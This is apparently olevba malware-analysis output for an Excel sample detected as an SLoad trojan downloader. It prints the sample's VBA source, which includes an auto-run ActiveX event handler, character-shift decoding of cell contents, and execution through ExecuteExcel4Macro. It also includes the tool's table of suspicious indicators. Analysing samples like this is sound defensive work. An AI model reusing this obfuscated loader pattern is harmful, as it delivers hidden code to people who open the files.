olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-06300fe884cdb51d9687c523aa9088a37185e7e9f45d54d9dc396e72cd0285a3.cls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO HEUR-Trojan-Downloader.MSOffice.SLoad.gen-06300fe884cdb51d9687c523aa9088a37185e7e9f45d54d9dc396e72cd0285a3.cls 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-06300fe884cdb51d9687c523aa9088a37185e7e9f45d54d9dc396e72cd0285a3.cls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-06300fe884cdb51d9687c523aa9088a37185e7e9f45d54d9dc396e72cd0285a3
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function km(k As String)
km = StrConv(k, vbFromUnicode)
End Function

Function de(a As String, b As Integer) As String
Dim ab() As Byte
ab = km(a)
For Each s In ab
de = de & noo(s + b)
Next
End Function

Function mingo(r, g As String)
Dim fl As String
Do
   fl = de(r.Text, Int((4 - 1 + 1) * Rnd + 1))
   Loop Until Left(fl, 1) = g
   mingo = fl
End Function
Function otto()
otto = rs(Int((8 - 6 + 1) * Rnd + 6))
End Function

Sub stepview()
Dim M()
Dim uur As String
dd1 = otto
dd2 = otto
dd3 = otto
cold = WorksheetFunction.CountA(ActiveSheet.UsedRange)
ReDim M(1 To cold)
For Each E In ActiveSheet.UsedRange.SpecialCells(xlCellTypeConstants)
s = mingo(E, "-")

M(CInt(LTrim(Mid(s, 2, 2)))) = Mid(s, 4)
Next E

dl = UBound(M) - LBound(M) + 1

uur = M(Int((dl - 5 - 1 + 1) * Rnd + 1))


For y = dl - 4 To dl

ExecuteExcel4Macro limo(dd1, dd2, dd3, M(y), uur)


Next
ActiveWorkbook.Close 0
End Sub


Function limo(d1, d2, d3, a, uu As String)
Dim afg As String
afg = a
limo = reDs("$", d3, "_", uu, reDs(";", d1, "'", d2, afg))
End Function


Function ff()
ff = "_"
End Function



Function noo(po As Integer)
noo = po: noo = Chr(noo)
End Function



Function rs(a As Long)
p = ""
Dim v As Integer
For i = 1 To a
v = Int((122 - 65 + 1) * Rnd + 65)
       Do While v > 90 And v < 97
         v = Int((122 - 65 + 1) * Rnd + 65)
       Loop
       p = p & noo(v)
Next
rs = p
End Function

Sub Stepprint()
Application.Dialogs(xlDialogPrint).Show: Application.WindowState = xlMinimized: ActiveWorkbook.Close 0
End Sub
Function reDs(a1, a2, a3, a4, y As String)
reDs = Replace(y, a1, a2): reDs = Replace(reDs, a3, a4)
End Function

Private Sub previews_Layout(ByVal Index As Long)
stepview
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |previews_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |previews_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://decalage.info|URL                                          |
|          |/python/oletools    |                                             |
+----------+--------------------+---------------------------------------------+

